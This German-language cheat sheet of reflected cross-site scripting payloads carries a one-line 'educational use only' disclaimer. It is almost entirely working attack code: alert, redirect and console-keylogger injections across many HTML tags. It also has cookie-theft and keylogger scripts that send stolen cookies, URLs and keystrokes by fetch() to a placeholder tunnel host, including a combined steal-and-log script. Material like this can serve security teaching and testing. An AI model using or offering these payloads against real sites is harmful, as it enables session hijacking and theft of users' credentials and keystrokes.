# Reflected XSS Payloads

**NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**

---

## Teil 1: Basis Payloads (ohne Server)

### 1.1 IMG-Tag Payloads

**Alert Box**
```html
<img src=x onerror="alert('XSS')">
```

**Cookie anzeigen**
```html
<img src=x onerror="alert(document.cookie)">
```

**Redirect (z.B. zu Amazon)**
```html
<img src=x onerror="window.location='https://amazon.de'">
```

**Alternative mit Script-Tag:**
```html
<script>window.location='https://amazon.de'</script>
```

**Mit window.location.href:**
```html
<img src=x onerror="window.location.href='https://amazon.de'">
```

**Keylogger (Console)**
```html
<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;console.log('KEYS:'+k)}">
```

### 1.2 Alternative XSS-Techniken (zeigen dass XSS nicht nur mit IMG funktioniert!)

**Script-Tag (klassisch)**
```html
<script>alert('XSS')</script>
```

**SVG mit onload**
```html
<svg onload="alert('XSS')">
```

**SVG mit Cookie-Diebstahl**
```html
<svg onload="alert(document.cookie)">
```

**Input mit autofocus**
```html
<input autofocus onfocus="alert('XSS')">
```

**Body-Tag mit onload**
```html
<body onload="alert('XSS')">
```

**IFRAME mit javascript:**
```html
<iframe src="javascript:alert('XSS')">
```

**Link mit javascript:**
```html
<a href="javascript:alert('XSS')">Klick mich</a>
```

**Video mit onerror**
```html
<video src=x onerror="alert('XSS')">
```

**Details-Tag mit ontoggle**
```html
<details open ontoggle="alert('XSS')">
```

**Marquee mit onstart**
```html
<marquee onstart="alert('XSS')">Text</marquee>
```

---


### Cookie-Diebstahl (Basic)
```html
<script>fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie)</script>
```

**Kompakte Version (IMG-Tag):**
```html
<img src=x onerror="fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie)">
```

**Mit zusätzlichen Infos:**
```html
<script>
fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie+'&url='+window.location.href+'&time='+Date.now())
</script>
```

---

### Keylogger mit Server

**Kompakte IMG-Version:**
```html
<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k));k=''}}">
```

---

### Cookie-Diebstahl + Keylogger (Kombination)
```html
<script>
// Cookies sofort stehlen
fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie);

// Keylogger installieren
var k='';
document.onkeydown=function(e){
  k+=e.key;
  if(k.length>15){
    fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k)+'&url='+location.href);
    k='';
  }
}
</script>
```

